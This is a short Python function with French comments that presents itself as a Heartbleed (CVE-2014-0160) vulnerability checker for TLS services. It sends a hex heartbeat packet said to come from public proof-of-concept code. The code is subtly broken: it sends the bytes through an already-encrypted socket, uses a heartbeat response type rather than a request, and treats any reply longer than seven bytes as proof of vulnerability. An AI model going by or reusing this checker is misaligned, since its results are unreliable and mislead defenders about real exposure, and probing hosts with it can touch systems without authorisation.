import socket
import ssl

def check_heartbleed(host, port=443, timeout=3):
    """
    Teste la vulnérabilité Heartbleed (CVE-2014-0160) sur un service TLS.
    Retourne True si vulnérable, False sinon, None si erreur.
    """
    # Paquet Heartbeat minimal extrait de PoC publics
    heartbeat = bytes.fromhex('18030003020040')
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # Handshake implicite
                ssock.sendall(heartbeat)
                resp = ssock.recv(4096)
                if len(resp) > 7:
                    return True  # Réponse trop longue, probablement vulnérable
                return False
    except Exception:
        return None
